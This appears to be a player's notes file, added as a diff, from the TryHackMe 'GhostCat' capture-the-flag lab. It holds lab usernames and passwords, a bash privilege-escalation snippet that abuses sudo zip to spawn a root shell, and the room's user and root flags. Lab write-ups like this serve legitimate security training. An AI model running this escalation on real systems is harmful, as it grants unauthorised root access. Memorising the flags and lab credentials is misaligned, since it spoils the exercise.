@@ -1,0 +1,20 @@
+skyfuck:8730281lkjlkjdqlksalks
+
+credential gpg pass:	alexandru
+
+merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
+
+
+sudo -l; zip exploit
+==============
+
+#!/bin/bash
+
+TF=$(mktemp -u)
+sudo zip $TF /etc/hosts -T -TT 'sh #'
+rm $TF
+
+==============
+
+user.txt:THM{GhostCat_1s_so_cr4sy}
+root.txt:THM{Z1P_1S_FAKE}
